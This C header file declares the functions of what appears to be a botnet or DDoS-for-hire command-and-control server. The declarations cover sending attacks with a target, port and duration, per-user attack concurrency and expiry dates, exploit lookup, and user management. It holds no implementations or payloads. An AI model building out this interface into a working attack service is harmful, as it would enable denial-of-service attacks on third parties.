#pragma once

#include <mysql.h>
#include <my_global.h>

int epoll_check_concurrents(const char *user);
void epoll_get_concurrents(const int fd);
void epoll_get_online_users(int line, const int fd);
int attack_count_args(int fd, int index, char *rdbuf);
int get_popularity_count(MYSQL *con, const int fd, const char *type);
void epoll_blacklist_ip(const int fd);
void get_popularity(MYSQL *con, const int fd);
void epoll_blacklist_ip(const int fd);
void epoll_kick_user(int line, const int fd);
void epoll_get_expiry_date(const int fd);
void epoll_print_banner(const int fd);
void epoll_send_chat(const char *_user, const int fd, const char *rdbuf);
void epoll_add_user(MYSQL *con,const int fd);
void epoll_remove_user(MYSQL *con, const int fd);
void epoll_receive_login(const int fd, char *buffer);
void epoll_remove_newline(char *buffer);
void epoll_send_chatprompt(const int fd, const char *user);
void epoll_print_loginprompt(const int fd);
int epoll_getconcurrents();
void cnc_log_mkdir();
void send_webhook(const char *argument);
void cnc_log_user(const char *user, const char *path, const char *data);
void _encrypt(const char *str);
void epoll_freeze_user(const int fd, const char *rdbuf);
void epoll_get_user_ranking_user(MYSQL *conn, const int index, const int fd);
void epoll_get_user_ranking(MYSQL *conn, const int fd);
void reset_password(MYSQL *con, const int fd);
void epoll_blacklist_attack_ip(MYSQL *con, const int fd);
void epoll_sent_attack(const int fd, int i, int timer, int port, char *target);
int fdgets(int fd, char *buffer, int bufferSize);
void epoll_unblacklist_ip_attack(MYSQL *conn, const int fd);
char *get_os();
void attack_menu(const int fd);
int find_exploit(int fd, char *buffer);
void broadcast_message(int fd);
